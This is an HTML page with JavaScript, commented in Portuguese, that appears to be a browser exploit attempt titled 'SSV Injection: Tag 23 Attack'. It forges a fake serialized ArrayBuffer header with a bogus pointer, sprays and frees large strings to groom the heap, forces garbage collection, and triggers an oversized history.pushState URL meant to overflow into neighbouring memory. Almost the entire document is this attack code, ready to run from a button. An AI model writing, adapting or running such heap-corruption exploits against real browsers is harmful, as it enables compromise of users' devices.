<!DOCTYPE html>
<html>
<head>
    <title>SSV Injection: Tag 23 Attack</title>
    <style>
        body { background-color: #100; color: #f55; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #f55; background: #000; color: #fff; cursor: pointer; }
        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #f55; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white; }
    </style>
</head>
<body>

    <h1>Ataque Final: Injeção de Tag SSV (23)</h1>
    <p>Tentando forçar a criação de um ArrayBuffer via deserialização corrompida.</p>

    <button onclick="startSSVAttack()">INICIAR INJEÇÃO DE TAG</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; // Alinhamento exato
        
        // Estrutura do Payload Falso (Imitando make_ssv_data do bundle.js)
        // Precisamos construir isso usando apenas bytes permitidos (< 0x20)
        // Tag 23 (0x17) é permitido. Version 6 (0x06) é permitido.
        
        function buildFakeSSV() {
            // Cria um buffer pequeno para montar o payload
            let buf = new Uint8Array(32);
            
            // Offset 0: Version (4 bytes) -> 0x00000006
            buf[0] = 6; 
            
            // Offset 4: Tag (1 byte) -> 0x17 (23 - ArrayBufferTransfer)
            buf[4] = 0x17;
            
            // Offset 5-7: Padding/Flags -> 0x00
            
            // Offset 8: Pointer (8 bytes). 
            // Como não podemos escrever bytes altos (ex: 0x41), vamos escrever 0x01.
            // Isso vai criar o ponteiro 0x0101010101010101.
            // Se o sistema tentar ler esse endereço, BINGO.
            for(let i=8; i<16; i++) buf[i] = 1;
            
            // Offset 16: Size (4 bytes).
            // Vamos dizer que o tamanho é pequeno (ex: 0x10 = 16 bytes)
            buf[16] = 0x10; 
            
            return buf;
        }

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startSSVAttack() {
            log("1. Preparando Payload SSV (Tag 23)...");
            
            // Converte o buffer binário para string (Latin-1) para injetar
            let fakeSSV = buildFakeSSV();
            let injectionStr = "";
            for(let i=0; i<fakeSSV.length; i++) {
                injectionStr += String.fromCharCode(fakeSSV[i]);
            }

            // O resto do overflow (padding até o próximo objeto)
            // Vamos ser conservadores: escrever apenas o cabeçalho
            let totalOverflow = injectionStr; 

            // Spray para garantir que temos vizinhos (Strings)
            // Strings são boas vítimas porque o SSV Parser pode tentar ler uma string como objeto SSV
            log("2. Spray de Strings (Vítimas)...");
            let victims = [];
            let pad = "B".repeat(1024*1024); // 1MB Strings
            for(let i=0; i<100; i++) {
                victims.push(pad + i);
            }
            
            // Buracos
            for(let i=0; i<100; i+=2) victims[i] = null;
            await forceGC();

            log("3. Disparando Injeção...");

            setTimeout(() => {
                try {
                    // Preenche até a borda
                    let buffer = "A".repeat(BASE_OFFSET);
                    // Adiciona nosso SSV falso no lugar do vizinho
                    buffer += injectionStr;
                    
                    // Adiciona um pouco de lixo 0x01 depois só pra garantir
                    buffer += "\x01".repeat(100);

                    // A Mágica: Passamos um objeto de estado que vai ser lido DE VOLTA
                    // Mas esperamos que o overflow corrompa a leitura do PRÓXIMO objeto
                    history.pushState({}, "ssv_pwn", "/" + buffer);

                    log("4. Verificando estabilidade...");
                    
                    // Tenta ler o state de volta. 
                    // Se corrompemos a estrutura interna, o navegador pode tentar materializar
                    // o nosso ArrayBuffer falso e travar ao acessar 0x0101...
                    let s = history.state;
                    log("Estado lido. Se você vê isso, não travou imediatamente.");

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
